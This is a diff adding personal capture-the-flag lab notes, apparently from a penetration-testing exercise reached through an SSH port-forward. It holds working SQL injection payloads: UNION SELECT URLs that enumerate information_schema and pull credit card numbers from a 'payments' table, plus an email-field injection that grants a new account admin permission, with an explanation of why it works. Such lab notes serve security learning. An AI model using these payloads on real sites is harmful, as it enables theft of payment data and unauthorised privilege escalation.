@@ -192,6 +192,32 @@ ssh -S /tmp/jump user -O forward -p 2222 -L 3321:10.100.28.48:80
 ================================================================================================
 CTFd4
 
+http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20select%20table_schema,table_name,column_name%20FROM%20information_schema.columns
+http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20SELECT%201,2,creditcard_number%20FROM%20payments
+http://localhost:3321/cases/productsCategory.php?category=13 UNION SELECT 1,2,creditcard_number FROM payments
+.php?category=13 UNION SELECT 1,2,contentName FROM tableName
+.php?category=13 UNION SELECT contentName,contentName,contentName FROM tableName
+
+admin creds
+
+FN       Hacker
+LN       Hacker
+USER     Hacker24
+PASS     randomPass
+EMAIL    Hacker\'',1);#
+
+
+why?     in the "query executed" below
+         INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', 'Hacker28', 'biub', 'Hacker\'''',1);#', 3)
+         we made             (Hacker,     Hacker,    Hacker24, <stuff>,  Hacker\'',1);#', ;3)
+         this works because the email is the last field before permissions, by putting  ,1);# we are hijacking the 
+       account creation and setting our own permission to 1, because syntax things, and nullifying the standard
+       3 (user) permissions set due to the # commenting out that portion. Giving ourselves god level perms and
+       ignoring everything after. cool.
+
+<name>\'',1);# 
+
+
 
 
 
